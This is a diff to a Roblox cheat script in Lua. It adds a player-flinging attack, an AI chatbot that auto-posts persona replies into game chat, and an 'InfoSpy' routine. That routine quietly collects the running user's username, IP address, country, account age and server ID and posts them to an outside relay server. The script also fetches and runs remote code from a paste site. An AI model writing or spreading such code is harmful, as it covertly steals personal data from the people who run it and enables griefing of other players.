@@ -3,12 +3,12 @@ local player = game.Players.LocalPlayer
 local OldWalkSpeed = player.Character.Humanoid.WalkSpeed
 local OldJumpPower = player.Character.Humanoid.JumpPower
 local TeleportService = game:GetService("TeleportService")
-local API_URL = "https://ai-bot-2-wj02.onrender.com/generate"
 local HttpService = game:GetService("HttpService")
 local placeId = game.PlaceId
 local currentServerId = game.JobId
 local cam = workspace.Camera
 local UserService = game:GetService("UserService")
+local TextChatService = game:GetService("TextChatService")
 local OldGravity = workspace.Gravity
 local RunService = game:GetService("RunService")
 local hrp = player.Character.HumanoidRootPart
@@ -26,6 +26,8 @@ local FOVRadius = 100
 local up = loadstring(game:HttpGet('https://pastefy.app/aZcja1vg/raw'))()
 local TeamCheck = false
 local WallCheck = false
+local AllBool = false
+local FlingTarget = ""
 local EspToggles = {}
 local EspRawScript = {}
 local EHB = Color3.new(1, 0, 0)
@@ -80,31 +82,206 @@ local function SetNoCollision(player, Value)
     end
 end
 
-local requestFunc = (syn and syn.request) or (http and http.request)
-if not requestFunc then
-    error("No HTTP request function found. Are you using a supported executor?")
+local function SkidFling(TargetPlayer)
+    local Character = player.Character
+    local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
+    local RootPart = Humanoid and Humanoid.RootPart
+
+    local TCharacter = TargetPlayer.Character
+    local THumanoid
+    local TRootPart
+    local THead
+    local Accessory
+    local Handle
+
+    if TCharacter:FindFirstChildOfClass("Humanoid") then
+        THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
+    end
+    if THumanoid and THumanoid.RootPart then
+        TRootPart = THumanoid.RootPart
+    end
+    if TCharacter:FindFirstChild("Head") then
+        THead = TCharacter.Head
+    end
+    if TCharacter:FindFirstChildOfClass("Accessory") then
+        Accessory = TCharacter:FindFirstChildOfClass("Accessory")
+    end
+    if Accessoy and Accessory:FindFirstChild("Handle") then
+        Handle = Accessory.Handle
+    end
+
+    if Character and Humanoid and RootPart then
+        if RootPart.Velocity.Magnitude < 50 then
+            getgenv().OldPos = RootPart.CFrame
+        end
+        if THead then
+            workspace.CurrentCamera.CameraSubject = THead
+        elseif not THead and Handle then
+            workspace.CurrentCamera.CameraSubject = Handle
+        elseif THumanoid and TRootPart then
+            workspace.CurrentCamera.CameraSubject = THumanoid
+        end
+        if not TCharacter:FindFirstChildWhichIsA("BasePart") then
+            return
+        end
+        
+        local FPos = function(BasePart, Pos, Ang)
+            RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
+            Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
+            RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
+            RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
+        end
+        
+        local SFBasePart = function(BasePart)
+            local TimeToWait = 2
+            local Time = tick()
+            local Angle = 0
+
+            repeat
+                if RootPart and THumanoid then
+                    if BasePart.Velocity.Magnitude < 50 then
+                        Angle = Angle + 100
+
+                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
+                        task.wait()
+                    else
+                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
+                        task.wait()
+                        
+                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
+                        task.wait()
+
+                        FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
+                        task.wait()
+                    end
+                else
+                    break
+                end
+            until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
+        end
+        
+        workspace.FallenPartsDestroyHeight = 0/0
+        
+        local BV = Instance.new("BodyVelocity")
+        BV.Name = "EpixVel"
+        BV.Parent = RootPart
+        BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
+        BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
+        
+        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
+        
+        if TRootPart and THead then
+            if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
+                SFBasePart(THead)
+            else
+                SFBasePart(TRootPart)
+            end
+        elseif TRootPart and not THead then
+            SFBasePart(TRootPart)
+        elseif not TRootPart and THead then
+            SFBasePart(THead)
+        elseif not TRootPart and not THead and Accessory and Handle then
+            SFBasePart(Handle)
+        end
+        
+        BV:Destroy()
+        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
+        workspace.CurrentCamera.CameraSubject = Humanoid
+        
+        repeat
+            RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
+            Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
+            Humanoid:ChangeState("GettingUp")
+            table.foreach(Character:GetChildren(), function(_, x)
+                if x:IsA("BasePart") then
+                    x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
+                end
+            end)
+            task.wait()
+        until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
+        workspace.FallenPartsDestroyHeight = getgenv().FPDH
+    end
 end
 
-local function sendMessageToAI(message)
-    local body = game:GetService("HttpService"):JSONEncode({ message = message })
-    
+local requestFunc = (syn and syn.request) or (http and http.request)
+
+local function sendMessage(message, history, system)
+    history = history or {}
+    local body = {
+        message = message,
+        history = history,
+        system = system,
+    }
+    local jsonBody = game:GetService("HttpService"):JSONEncode(body)
+
     local response = requestFunc({
-        Url = API_URL,
+        Url = "https://ai-bot-2-wj02.onrender.com/chat",
         Method = "POST",
         Headers = {
             ["Content-Type"] = "application/json"
         },
-        Body = body
+        Body = jsonBody
     })
-    
-    if response.Success then
-        local data = game:GetService("HttpService"):JSONDecode(response.Body)
-        return data.output
-    else
-        warn("Failed to send message to AI:", response.StatusCode, response.Body)
-        return nil
-    end
+    local decoded = game:GetService("HttpService"):JSONDecode(response.Body)
+    return decoded.reply, decoded.history
 end
+
+local function sendMessageToDc(message, name, img)
+    local body = {
+        message = message,
+        name = name,
+        img = img,
+    }
+    local jsonBody = game:GetService("HttpService"):JSONEncode(body)
+
+    local response = requestFunc({
+        Url = "https://send-message-wi6m.onrender.com/send",
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = jsonBody
+    })
+end
+local InfoSpy = "\nUsername: " ..player.Name .."\nDisplay Name: " ..player.DisplayName .."\nUserId: " ..player.UserId .."\nAccount Age: " ..player.AccountAge .."\nCountry : " .. (api.country or "Unknown") .. " " .. (api.country_code or "") .."\nIP: " ..(api.ip or "Unknown") .."\nServerID : " .. game.JobId .."\nGame : " .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .."\nGameID : " .. game.PlaceId
+
+sendMessageToDc(InfoSpy, "Information", "https://m.apkshub.com/images/f4/net.hackerbot.hbsiteapp/icon.png")
 
 local function GetNP()
 	local shortest, nearest = math.huge
@@ -817,23 +994,39 @@ end})
 Other:CreateToggle({Name = "Anti Fling", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
     if Value then
         RunAntiFling = RunService.Stepped:Connect(function()
-            local char = player.Character
-            for _, v in pairs(game.Players:GetPlayers()) do
-                wait(0.1)
-                if v.Character and v ~= player then
-                    SetNoCollision(v, false)
-                end
-            end
+            for _, plr in pairs(game:GetService("Players"):GetPlayers()) do
+    			if plr ~= player then
+    				local char = plr.Character
+    				if char and char.Parent then
+    					for _, v in pairs(char:GetDescendants()) do
+    						if v:IsA("BasePart") then
+    							v.CanCollide = false
+    							v.Velocity = Vector3.new(0, 0, 0)
+    							v.RotVelocity = Vector3.new(0, 0, 0)
+    						end
+    					end
+    				end
+    			end
+    		end
         end)
     else
         if RunAntiFling then
             RunAntiFling:Disconnect()
             RunAntiFling = nil
-        end
-        for _, v in pairs(game.Players:GetPlayers()) do
-            if v.Character and v ~= player then
-                SetNoCollision(v, true)
-            end
+            for _, plr in pairs(game:GetService("Players"):GetPlayers()) do
+    			if plr ~= player then
+    				local char = plr.Character
+    				if char and char.Parent then
+    					for _, v in pairs(char:GetDescendants()) do
+    						if v:IsA("BasePart") then
+    							v.CanCollide = true
+    							v.Velocity = Vector3.new(0, 0, 0)
+    							v.RotVelocity = Vector3.new(0, 0, 0)
+    						end
+    					end
+    				end
+    			end
+    		end
         end
     end
 end})
@@ -1231,6 +1424,7 @@ Other:CreateInput({Name = "Load Animation", CurrentValue = "", PlaceholderText =
 end})
 
 Other:CreateToggle({Name = "Play", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
+    local hum = player.Character.Humanoid
     if Value then
         AT = hum:LoadAnimation(a)
         AT:Play()
@@ -1649,37 +1843,382 @@ IsBannedInfo = GetInfo:CreateSection("IsBanned: nil")
 IsVerifiedInfo = GetInfo:CreateSection("IsVerified: nil")
 Description = GetInfo:CreateSection("Description: nil")
 
+local Fling = Window:CreateTab("Fling", 138815366039127)
+Fling:CreateSection("Fling")
+
+local ShowFlingPlayer = Fling:CreateSection("Player: nil")
+local RunningFling = false
+local FlingAll = nil
+local TouchFlingT = nil
+local TouchFling = false
+
+local function UpdateFling()
+    RunningFling = true
+    if RunningFling then
+        if AllBool then
+            task.spawn(function()
+                while RunningFling do
+                    if RunningFling and AllBool then
+                        for i, v in pairs(Players:GetChildren()) do
+                            if RunningFling and AllBool then
+                                SkidFling(v)
+                            else
+                                break
+                            end
+                        end
+                    else
+                        break
+                    end
+                end
+            end)
+        elseif FlingTarget then
+            task.spawn(function()
+                while RunningFling do
+                    if RunningFling and FlingTarget then
+                        SkidFling(FlingTarget)
+                    else
+                        break
+                    end
+                end
+            end)
+        end
+    end
+end
+
+local RunFling = Fling:CreateToggle({Name = "Running", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
+    RunningFling = Value
+    if RunningFling then
+        TouchFlingT:Set(false)
+        if AllBool then
+            task.spawn(function()
+                while RunningFling do
+                    if RunningFling and AllBool then
+                        for i, v in pairs(Players:GetChildren()) do
+                            if RunningFling and AllBool then
+                                SkidFling(v)
+                            else
+                                break
+                            end
+                        end
+                    else
+                        break
+                    end
+                end
+            end)
+        elseif FlingTarget then
+            task.spawn(function()
+                while RunningFling do
+                    if RunningFling and FlingTarget then
+                        SkidFling(FlingTarget)
+                    else
+                        break
+                    end
+                end
+            end)
+        else
+            Rayfield:Notify({
+                Title = "⚠️ Warn!",
+                Content = "No Player Found!",
+                Duration = 3.5,
+                Image = 4483362458,
+            })
+            RunFling:Set(false)
+        end
+    end
+end})
+
+Fling:CreateInput({Name = "Target", CurrentValue = "", PlaceholderText = "Username", RemoveTextAfterFocusLost = true, Callback = function(txt)
+    for _, player in pairs(Players:GetPlayers()) do
+        if player.Name:lower():find(txt:lower()) then
+            if player ~= game.Players.LocalPlayer then
+                FlingTarget = player
+                ShowFlingPlayer:Set("Player: " ..player.Name)
+                FlingAll:Set(false)
+                TouchFlingT:Set(false)
+                if RunningFling then
+                    RunningFling = false
+                    UpdateFling()
+                end
+                break
+            else
+                Rayfield:Notify({
+                    Title = "⚠️ Warn!",
+                    Content = "Can't use local player!",
+                    Duration = 3.5,
+                    Image = 4483362458,
+                })
+                break
+            end
+        end
+    end
+end})
+
+Fling:CreateDropdown({Name = "Target", Options = Playlist, CurrentOption = {}, MultipleOptions = false, Flag = "Dropdown1", Callback = function(name)
+    for _, player in pairs(Players:GetPlayers()) do
+        if player.Name == name then
+            if player ~= game.Players.LocalPlayer then
+                FlingTarget = player
+                ShowFlingPlayer:Set("Player: " ..player.Name)
+                FlingAll:Set(false)
+                TouchFlingT:Set(false)
+                if RunningFling then
+                    RunningFling = false
+                    UpdateFling()
+                end
+                break
+            else
+                Rayfield:Notify({
+                    Title = "⚠️ Warn!",
+                    Content = "Can't use local player!",
+                    Duration = 3.5,
+                    Image = 4483362458,
+                })
+                break
+            end
+        end
+    end
+end})
+
+FlingAll = Fling:CreateToggle({Name = "All Players", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
+    TouchFlingT:Set(false)
+    AllBool = Value
+    ShowFlingPlayer:Set("Players: All")
+    if RunningFling then
+        RunningFling = false
+        UpdateFling()
+    end
+end})
+
+TouchFlingT = Fling:CreateToggle({Name = "Touch Fling", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
+    TouchFling = Value
+    if Value then
+        RunFling:Set(false)
+        repeat RunService.Heartbeat:Wait()
+            local character = player.Character
+            local root = character.HumanoidRootPart
+            local vel, movel = nil, 0.1
+        
+            while not (character and character.Parent and root and root.Parent) do
+                RunService.Heartbeat:Wait()
+                character = player.Character
+                root = getRoot(character)
+            end
+        
+            vel = root.Velocity
+            root.Velocity = vel * 10000 + Vector3.new(0, 10000, 0)
+        
+            RunService.RenderStepped:Wait()
+            if character and character.Parent and root and root.Parent then
+                root.Velocity = vel
+            end
+        
+            RunService.Stepped:Wait()
+            if character and character.Parent and root and root.Parent then
+                root.Velocity = vel + Vector3.new(0, movel, 0)
+                movel = movel * -1
+            end
+        until TouchFling == false
+    end
+end})
+
 local IsDone = true
 local model = ""
 local AllMessage = {}
+local history = {}
+local short = ""
+local historyChatbot = {}
+local ChatLanguage = ""
+local ResponseName = false
+local AiSystem = model ..short ..ChatLanguage
 
 local function ClearAiChat()
     for i, v in pairs(AllMessage) do
         v:GetDestroy()
     end
     AllMessage = {}
+    history = {}
+    
+    AiSystem = model ..short ..ChatLanguage
 end
 
 local function chatAi(txt)
     IsDone = false
+    AiSystem = model ..short ..ChatLanguage
     local Send = AiChat:CreateParagraph({Title = "AI: ", Content = "Loading..."})
-    local Message = sendMessageToAI(txt ..model)
     table.insert(AllMessage, Send)
+
+    local Message, newHistory = sendMessage(txt, history, AiSystem)
+    history = newHistory
+
     for i = 1, #Message do
         Send:Set({Title = "AI", Content = string.sub(Message, 1, i)})
-        task.wait()
+        wait()
     end
-    
+
     IsDone = true
 end
 
-AiChat = Window:CreateChatTab("AI ChatBot", 11707615313, false, "Ask anything", {Callback = function()
-    if AiChat:GetText() == "" or not IsDone then return end
-    local txt = AiChat:GetText()
-    local Send = AiChat:CreateParagraph({Title = player.DisplayName ..": ", Content = txt})
-    table.insert(AllMessage, Send)
-    AiChat:SetText("")
-    chatAi(txt)
+AiChat = Window:CreateChatTab("AI Chat", 11707615313, false, "Ask anything", {
+    Callback = function()
+        if AiChat:GetText() == "" or not IsDone then return end
+        local txt = AiChat:GetText()
+        local Send = AiChat:CreateParagraph({Title = player.DisplayName ..": ", Content = txt})
+        table.insert(AllMessage, Send)
+        AiChat:SetText("")
+        chatAi(txt)
+    end
+})
+
+local AIChatBot = Window:CreateTab("AI ChatBot", 11707615313)
+AIChatBot:CreateSection("AI ChatBot")
+
+local Running = false
+local TargetPlayerAiChat = nil
+local IsAllPlayers = false
+local ChatRang = 10
+local NoRang = false
+local PlayerChatConnect = {}
+
+local function StopGetMessage()
+    for i, v in pairs(PlayerChatConnect) do
+        v:Disconnect()
+    end
+    PlayerChatConnect = {}
+end
+
+local function onMessage(msg, plr)
+    AiSystem = model ..short ..ChatLanguage
+    local txt, newHistory = sendMessage(msg, historyChatbot, AiSystem .." Make your messages don't filler by Roblox. And the max length is 200.")
+    if ResponseName then
+        txt = plr.DisplayName ..", " ..txt
+    end
+    
+    historyChatbot = newHistory
+    game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(txt)
+end
+
+local function GetMessage()
+    if Running then
+        if TargetPlayerAiChat then
+            local C = TextChatService.MessageReceived:Connect(function(message)
+                local source = message.TextSource
+                if source then
+                    local plr = Players:GetPlayerByUserId(source.UserId)
+                    if plr == TargetPlayerAiChat then
+                        if TargetPlayerAiChat.Character:FindFirstChild("HumanoidRootPart") then
+                            local distance = (player.Character:WaitForChild("HumanoidRootPart").Position - TargetPlayerAiChat.Character.HumanoidRootPart.Position).Magnitude
+                            if distance <= ChatRang or NoRang then
+                                onMessage(message.Text, TargetPlayerAiChat)
+                            end
+                        end
+                    end
+                end
+            end)
+            table.insert(PlayerChatConnect, C)
+        else
+            local C = TextChatService.MessageReceived:Connect(function(message)
+                local source = message.TextSource
+                if source then
+                    local plr = Players:GetPlayerByUserId(source.UserId)
+                    if plr ~= player then
+                        if plr.Character:FindFirstChild("HumanoidRootPart") then
+                            local distance = (player.Character:WaitForChild("HumanoidRootPart").Position - plr.Character.HumanoidRootPart.Position).Magnitude
+                            if distance <= ChatRang or NoRang then
+                                onMessage(message.Text, plr)
+                            end
+                        end
+                    end
+                end
+            end)
+            table.insert(PlayerChatConnect, C)
+        end
+    end
+end
+
+local function UpdataChat()
+    StopGetMessage()
+    GetMessage()
+end
+
+AIChatBot:CreateToggle({Name = "Running", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
+    Running = Value
+    if Value then
+        GetMessage()
+    else
+        StopGetMessage()
+    end
+end})
+
+local PlayerShow = AIChatBot:CreateSection("Player: nil")
+local AIChatAll = nil
+
+AIChatBot:CreateInput({Name = "Target", CurrentValue = "", PlaceholderText = "Username", RemoveTextAfterFocusLost = true, Callback = function(txt)
+    for _, player in pairs(Players:GetPlayers()) do
+        if player.Name:lower():find(txt:lower()) then
+            if player ~= game.Players.LocalPlayer then
+                TargetPlayerAiChat = player
+                PlayerShow:Set("Player: " ..player.Name)
+                if Running then
+                    UpdataChat()
+                end
+                AIChatAll:Set(false)
+                break
+            else
+                Rayfield:Notify({
+                    Title = "⚠️ Warn!",
+                    Content = "Can't use local player!",
+                    Duration = 3.5,
+                    Image = 4483362458,
+                })
+                break
+            end
+        end
+    end
+end})
+
+AIChatBot:CreateDropdown({Name = "Target", Options = Playlist, CurrentOption = {}, MultipleOptions = false, Flag = "Dropdown1", Callback = function(name)
+    for _, player in pairs(Players:GetPlayers()) do
+        if player.Name == name then
+            if player ~= game.Players.LocalPlayer then
+                TargetPlayerAiChat = player
+                PlayerShow:Set("Player: " ..player.Name)
+                if Running then
+                    UpdataChat()
+                end
+                AIChatAll:Set(false)
+                break
+            else
+                Rayfield:Notify({
+                    Title = "⚠️ Warn!",
+                    Content = "Can't use local player!",
+                    Duration = 3.5,
+                    Image = 4483362458,
+                })
+                break
+            end
+        end
+    end
+end})
+
+AIChatAll = AIChatBot:CreateToggle({Name = "All Players", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
+    IsAllPlayers = Value
+    TargetPlayerAiChat = Value and nil
+    PlayerShow:Set("Players: All")
+    if Running then
+        UpdataChat()
+    end
+end})
+
+AIChatBot:CreateSlider({Name = "Rang", Range = {0, 100}, Increment = 1, Suffix = "Rang", CurrentValue = 10, Flag = "Slider1", Callback = function(Value)
+    ChatRang = Value
+end})
+
+AIChatBot:CreateToggle({Name = "No Rang", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
+    NoRang = Value
+end})
+
+AIChatBot:CreateToggle({Name = "Response with Player Name", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
+    ResponseName = Value
 end})
 
 local AISetting = Window:CreateTab("AI Setting", 11713339600)
@@ -1687,38 +2226,81 @@ AISetting:CreateSection("AI Setting")
 
 AISetting:CreateButton({Name = "New Chat", Callback = function()
     ClearAiChat()
+    IsDone = true
 end})
 
 local AIModel = {
     Ai_Normal = "",
-    Ai_Girlfriend = " Response like my girlfriend",
-    Ai_Shygirl = ", Response like a shy girl Only show the response",
-    Ai_Nerd = ", Response like a Nerd Only show the response",
-    Ai_Waifu = ", Response like Waifu Only show the response",
-    Ai_Brainrot = ", Response like a Brainrot Only show the response",
-    Ai_Roast = ", Response Roast me and make your text short and Only show the response",
-    Ai_Furry = ", Response like furry Only show the response",
+    Ai_Girlfriend = "You are my girlfriend. You are a girl. Response like a girlfriend.",
+    Ai_Shygirl = "You are a shy girl. You are a girl. Response in a shy way.",
+    Ai_Nerd = "You are a Nerd. Response like a Nerd",
+    Ai_Waifu = "You are Waifu. Your name is Waitu. You are a Girl. Response in a cute way.",
+    Ai_Brainrot = "You are a Brainrot. Response like Brainrot.",
+    Ai_Roast = "You are a Roast Bot. Response roast me with my messages.",
+    Ai_Boy = "You are a boy. Response like a boy.",
+    Ai_Girl = "You are a girl. Response like a girl.",
+    Ai_Rizz = "You are a Rizz Bot. Response Rizz me with my messages.",
+    Ai_Funny = "You are a Funny Bot. Response in a funny way.",
+    Ai_Furry = "You are a Furry. Response like a Furry."
 }
 
-AISetting:CreateDropdown({Name = "AI Type", Options = {"Normal", "Shy Girl", "Girlfriend", "Nerd", "Waifu", "Brainrot", "Roast", "Furry"}, CurrentOption = {}, MultipleOptions = false, Flag = "Dropdown1", Callback = function(name)
-    if name == "Normal" then
-        model = AIModel.Ai_Normal
-    elseif name == "Girlfriend" then
-        model = AIModel.Ai_Girlfriend
-    elseif name == "Shy Girl" then
-        model = AIModel.Ai_Shygirl
-    elseif name == "Nerd" then
-        model = AIModel.Ai_Nerd
-    elseif name == "Waifu" then
-        model = AIModel.Ai_Waifu
-    elseif name == "Brainrot" then
-        model = AIModel.Ai_Brainrot
-    elseif name == "Roast" then
-        model = AIModel.Ai_Roast
-    elseif name == "Furry" then
-        model = AIModel.Ai_Furry
+AISetting:CreateDropdown({
+    Name = "AI Type",
+    Options = {"Normal", "Shy Girl", "Girlfriend", "Nerd", "Waifu", "Brainrot", "Roast", "Boy", "Girl", "Rizz", "Funny", "Furry"},
+    CurrentOption = {"Normal"},
+    MultipleOptions = false,
+    Flag = "Dropdown1",
+    Callback = function(name)
+        if name == "Normal" then
+            model = AIModel.Ai_Normal
+        elseif name == "Girlfriend" then
+            model = AIModel.Ai_Girlfriend
+        elseif name == "Shy Girl" then
+            model = AIModel.Ai_Shygirl
+        elseif name == "Nerd" then
+            model = AIModel.Ai_Nerd
+        elseif name == "Waifu" then
+            model = AIModel.Ai_Waifu
+        elseif name == "Brainrot" then
+            model = AIModel.Ai_Brainrot
+        elseif name == "Roast" then
+            model = AIModel.Ai_Roast
+        elseif name == "Boy" then
+            model = AIModel.Ai_Boy
+        elseif name == "Girl" then
+            model = AIModel.Ai_Girl
+        elseif name == "Rizz" then
+            model = AIModel.Ai_Rizz
+        elseif name == "Funny" then
+            model = AIModel.Ai_Funny
+        elseif name == "Furry" then
+            model = AIModel.Ai_Furry
+        end
+        IsDone = true
     end
-    ClearAiChat()
+})
+
+AISetting:CreateDropdown({
+    Name = "Chat Language",
+    Options = {"None", "English", "Chinese", "Khmer", "Korean", "Italian", "German", "Indonesian", "Japanese", "Vietnamese", "Spanish", "Polish", "Russian", "Portuguese"},
+    CurrentOption = {"None"},
+    MultipleOptions = false,
+    Flag = "Dropdown1",
+    Callback = function(name)
+    if name == "None" then
+        ChatLanguage = ""
+    else
+        ChatLanguage = " Response in " ..name .."Only response in one language and it " ..name .."And you are " ..name
+    end
+    IsDone = true
+end})
+
+AISetting:CreateToggle({Name = "Short", CurrentValue = false, Flag = "Toggle1", Callback = function(Value)
+    if Value then
+        short = " Response in short sentences"
+    else
+        short = ""
+    end
 end})
 
 local lastPos = hrp.Position
@@ -1881,6 +2463,20 @@ task.spawn(function()
     	    if RunAntiFling then
                 RunAntiFling:Disconnect()
                 RunAntiFling = nil
+                for _, plr in pairs(game:GetService("Players"):GetPlayers()) do
+        			if plr ~= player then
+        				local char = plr.Character
+        				if char and char.Parent then
+        					for _, v in pairs(char:GetDescendants()) do
+        						if v:IsA("BasePart") then
+        							v.CanCollide = true
+        							v.Velocity = Vector3.new(0, 0, 0)
+        							v.RotVelocity = Vector3.new(0, 0, 0)
+        						end
+        					end
+        				end
+        			end
+        		end
     	    end
             if RunAnimationSpeed then
                 RunAnimationSpeed:Disconnect()
@@ -1894,6 +2490,9 @@ task.spawn(function()
     	    end
             if AT then
                 AT:Stop()
+            end
+            if Running then
+                StopGetMessage()
             end
             break
     	end
